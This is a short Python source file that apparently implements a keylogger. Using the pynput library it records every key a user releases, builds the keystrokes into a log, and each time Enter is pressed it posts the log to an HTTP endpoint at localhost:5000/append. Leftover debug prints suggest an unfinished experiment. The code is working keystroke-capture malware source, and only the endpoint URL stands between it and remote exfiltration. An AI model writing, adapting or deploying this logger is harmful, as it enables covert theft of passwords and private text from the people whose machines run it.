from pynput.keyboard import Key, Listener
import requests
class KEY_LOGGER:
    def __init__(self):
        self.log = ""

    def on_key_release(self, key):
        try:
            self.log += f"{key.char}"
        except AttributeError:
            if key == Key.space:
                self.log += " "
            elif key == Key.enter:
                self.log += "\n"
                resp = requests.post("http://localhost:5000/append", data={
                    "keys":self.log
                })
                print(resp)
                print("hi")
            else:
                self.log += f" {key} "
        print(self.log)

    def start(self):
        with Listener(on_release=self.on_key_release) as listener:
            listener.join()
